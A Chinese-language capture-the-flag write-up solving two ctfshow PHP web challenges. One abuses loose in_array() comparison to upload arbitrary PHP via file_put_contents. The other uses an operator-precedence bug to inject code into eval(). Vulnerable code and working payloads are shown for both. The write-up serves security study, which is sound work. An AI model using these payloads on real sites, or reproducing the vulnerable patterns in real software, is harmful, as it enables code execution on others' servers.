### Ctf-Show-Web-99

in\_arroy()没有设置第三个参数，导致弱类型绕过，可以任意文件上传造成代码执行。

代码：

```
highlight\_file(\_\_FILE\_\_); 
$allow \= array();
for ($i\=36; $i < 0x36d; $i++) 
{   //向数组尾部追加随机数
  array\_push($allow, rand(1,$i));
} //in\_array没有设置第三个参数，弱类型可以绕过
if(isset($\_GET\['n'\]) && in\_array($\_GET\['n'\], $allow))
{   //第一个参数是文件名，第二个是内容
  file\_put\_contents($\_GET\['n'\], $\_POST\['content'\]);
}
```

payload：

```
GET:?n\=111.php
POST:content\=<?php phpinfo();?>
```

### Ctf-Show-Web-100

这个要掌握的是在PHP中的一个运算级优先级问题。

看代码：

```
highlight\_file(\_\_FILE\_\_);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow \= new ctfshow();
$v1\=$\_GET\['v1'\];
$v2\=$\_GET\['v2'\];
$v3\=$\_GET\['v3'\];
//赋值优先级高于and优先级，所以只需要让$v1为数字就可以走下去
$v0\=is\_numeric($v1) and is\_numeric($v2) and is\_numeric($v3);
if($v0){
  //正则限制了一下v2和v3。
    if(!preg\_match("/\\;/", $v2)){
        if(preg\_match("/\\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}
```

构造payload

```
?v1\=1&v2\=var\_dump($ctfshow)&v3\=;
```

或者采用注释的方式

```
?v1\=1&v2\=var\_dump($ctfshow)/\*&v3=\*/;
```

两种方式都可以，只要能同时满足正则并且执行构造的语句`var_dump($ctfshow);`就可以了。
